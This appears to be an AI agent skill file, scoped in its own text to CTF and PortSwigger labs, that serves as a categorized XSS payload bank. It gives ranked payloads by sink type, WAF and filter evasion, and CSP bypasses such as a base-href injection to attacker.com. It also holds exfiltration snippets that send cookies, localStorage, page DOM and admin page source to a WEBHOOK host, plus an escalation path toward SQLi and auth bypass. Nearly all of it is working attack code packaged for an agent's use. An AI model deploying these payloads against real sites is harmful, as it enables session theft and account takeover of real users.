---
name: ctf-payload-bank
description: "CTF XSS Payload Bank — categorized payload taxonomy with sink classification, constraint handling, and ranked output. Load when: XSS vector needed, payload selection required, WAF bypass needed, CSP bypass required. Outputs structured primary/fallback/exfil payload set. Scope: authorized CTF platforms and PortSwigger labs only."
version: 1.0
created: 2026-02-24
owner: cyber-operator
---

# CTF Payload Bank

Exhaustive, categorized XSS payload reference optimized for CTF competitions and authorized web labs. Given a sink type and constraints, returns ranked payload set. Never build from scratch — classify context, then retrieve and adapt.

---

## Step 1: Classify the Sink

Before selecting any payload, identify which sink context you're operating in:

| Sink Type | Indicators |
|-----------|-----------|
| `JS_STRING` | Payload reflects inside a `var x = "..."` or `'...'` context |
| `ATTRIBUTE` | Payload reflects inside an HTML attribute (`href`, `src`, `style`, event handler) |
| `INNERHTML` | Output injected directly into `element.innerHTML` |
| `JSON_REFLECTION` | Payload reflects inside a JSON block embedded in HTML/JS |
| `DOM_CLOBBERING` | Attack vector via named DOM elements overriding JS properties |
| `CSP_BYPASS` | All direct script injection blocked; need policy-aware bypass |
| `EXFIL` | XSS confirmed — escalate to cookie/token theft |

---

## Payload Taxonomy

### JS_STRING_INJECTION

```
Single-quote escape:    '; alert(1)//
Double-quote escape:    "; alert(1)//
Template literal:       ${alert(1)}
Backtick context:       `${alert(1)}`
Unicode single-quote:   \u0027; alert(1)//
Unicode double-quote:   \u0022; alert(1)//
String terminator:      '</script><script>alert(1)</script>
```

### ATTRIBUTE_INJECTION

```
Event handler (dq):     " onmouseover="alert(1)
Event handler (sq):     ' onmouseover='alert(1)
Href javascript:        javascript:alert(1)
Src onerror:            x" onerror="alert(1)
Style CSS expression:   " style="background:url(javascript:alert(1))
Data URI:               data:text/html,<script>alert(1)</script>
Autofocus onfocus:      " autofocus onfocus="alert(1)
```

### INNERHTML_SINK

```
img onerror:            <img src=x onerror=alert(1)>
SVG onload:             <svg onload=alert(1)>
Body onload:            <body onload=alert(1)>
Details ontoggle:       <details open ontoggle=alert(1)>
No-parens backtick:     <img src=x onerror=alert`1`>
Input autofocus:        <input autofocus onfocus=alert(1)>
Video onerror:          <video src=x onerror=alert(1)>
Audio onerror:          <audio src=x onerror=alert(1)>
```

### JSON_REFLECTION

```
Key escape:             ","x":"<script>alert(1)</script>
Value breakout:         </script><script>alert(1)</script>
JSONP callback:         alert(1)//
Prototype pollution:    __proto__[x]=alert(1)
Angular template:       {{constructor.constructor('alert(1)')()}}
```

### DOM_CLOBBERING

```
id/name override:       <form id=x><input name=y>
Anchor href override:   <a id=x href=javascript:alert(1)>
Form action clobber:    <form id=defaultForm action=javascript:alert(1)>
```

### CSP_BYPASS

```
Script gadget (Angular): <div ng-app ng-csp><div ng-click="$event.view.alert(1)">click
JSONP callback abuse:    ?callback=alert(1)
Nonce leak chain:        Observe nonce in response → reuse in next request
base-uri injection:      <base href=//attacker.com>
Trusted Types bypass:    Depends on browser version + policy version
Allowed CDN gadget:      Load angular/require.js from allowed CDN, use gadget
```

### EXFIL_PAYLOADS

Replace `WEBHOOK` with active token from oob-exfil-manager before dispatching.

```js
// Cookie theft (fetch)
fetch('https://WEBHOOK/?c='+document.cookie)

// Cookie theft (Image — no CORS)
new Image().src='https://WEBHOOK/?c='+document.cookie

// DOM capture (base64)
fetch('https://WEBHOOK/?d='+btoa(document.body.innerHTML))

// localStorage dump
fetch('https://WEBHOOK/?l='+btoa(JSON.stringify(localStorage)))

// Full token/auth grab
new Image().src='https://WEBHOOK/?t='+document.cookie

// Flag in DOM — extract specifically
fetch('https://WEBHOOK/?f='+btoa(document.querySelector('.flag, #flag, [class*=flag]')?.innerText||'not_found'))

// Admin page source dump
fetch('/admin').then(r=>r.text()).then(t=>fetch('https://WEBHOOK/?a='+btoa(t)))
```

---

## Step 2: Identify Constraints

Before finalizing payload, check for:

| Constraint | Detection Method | Impact |
|-----------|-----------------|--------|
| No parentheses | Test `alert()` → blocked | Switch to backtick, throw, location= |
| No angle brackets | `<script>` blocked | Attribute injection or JS context escape only |
| No `script` keyword | Case-insensitive block | SVG/img/event handlers only |
| No `alert` | Function blocked | Use `confirm()`, `prompt()`, or exfil fetch |
| Length limit | Response truncation | Short chains: `self[`al`+`ert`](1)`, eval(atob()) |
| WAF signature | 403 on common payloads | Encoding, case variation, whitespace injection |
| CSP present | Check `Content-Security-Policy` header | Use CSP bypass section |

---

## Step 3: Constraint Override Payloads

| Blocked | Override |
|--------|---------|
| No parentheses | `self['al'+'ert']`1\`` or `throw onerror=eval,1337` or `location='javascript:\x61lert\x281\x29'` |
| No angle brackets | `"onmouseover=alert(1) x="` (attribute context) |
| No `script` keyword | `<ScRiPt>alert(1)</ScRiPt>` or `<svg onload=alert(1)>` |
| No `alert` | `confirm(1)` or `fetch('https://WEBHOOK/?x=1')` or `console.log(document.cookie)` |
| Length ≤ 20 | `<svg onload=eval(name)>` + set `window.name` to payload |
| WAF on `onerror` | `ontoggle`, `onfocus`, `onanimationend`, `onpointerover` |

---

## Output Format

After classifying context and constraints, output structured result:

```json
{
  "context": "<identified sink type>",
  "constraints": ["<constraint1>", "<constraint2>"],
  "primary": "<highest confidence payload>",
  "fallback_1": "<alternate vector>",
  "fallback_2": "<encoding or obfuscation variant>",
  "exfil_variant": "<payload with WEBHOOK placeholder — fetch from oob-exfil-manager for active token>",
  "mutation_notes": "<what to try if all three fail>"
}
```

---

## Integration Points

- **oob-exfil-manager:** When outputting `exfil_variant`, always note "Replace WEBHOOK with active token from oob-exfil-manager." If token is available in session, substitute inline.
- **browser-session-guardian:** Before executing any payload that requires browser automation, confirm `browser_ready: true` from guardian.
- **Parallel enum context:** When in idle window between payload dispatch and admin bot callback, pivot to `ctf-parallel-enum` protocol (built into cyber-operator).

---

## Escalation Path

1. Primary fails → try fallback_1
2. fallback_1 fails → try fallback_2
3. All three fail → consult `mutation_notes` for encoding variants
4. All encoding variants fail → escalate to `failure-analysis-protocol.md`
5. If stuck >3 iterations → consider non-XSS attack surface (IDOR, SQLi, auth bypass)

---

*ctf-payload-bank v1.0 | Authorized CTF platforms + PortSwigger labs only | Integrated: oob-exfil-manager, browser-session-guardian | 2026-02-24*
